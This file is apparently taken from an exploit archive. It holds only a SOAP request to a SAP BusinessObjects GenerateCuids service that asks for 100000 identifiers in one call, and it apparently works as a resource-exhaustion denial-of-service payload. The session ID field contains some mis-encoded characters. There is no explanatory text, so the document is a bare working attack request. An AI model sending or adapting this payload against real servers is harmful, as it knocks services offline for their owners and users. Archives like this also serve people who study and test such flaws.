exploits/44268_0.html

<?xml version='1.0' encoding='UTF-8'?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Body>
<GenerateCuids xmlns="http://biplatform.dsws.businessobjects.com/2007/06/01">
    <SessionID xmlns="http://biplatform.dsws.businessobjects.com/2007/06/01">it-
    dirs8l4vkou4%3A6400|%40it-dirs8l4vkou4%3A6400|it-
    dirs8l4vkou4%3A6400%402149JabmPLnS4EzOXTzw2148JfhkJg2K28oTJ1Nq|osca%3Aiiop
    %3A%2F%2Fit-
    dirs8l4vkou4%3A6400%3BSI_SESSIONID%3D2148JfhkJg2K28oTJ1Nq|en_US|America/Los_
    Angelesâ€>
    </SessionID>
    <numCuids xmlns="http://biplatform.dsws.businessobjects.com/2007/06/01">
           100000
    </numCuids>
</GenerateCuids>
</soapenv:Body>
</soapenv:Envelope>
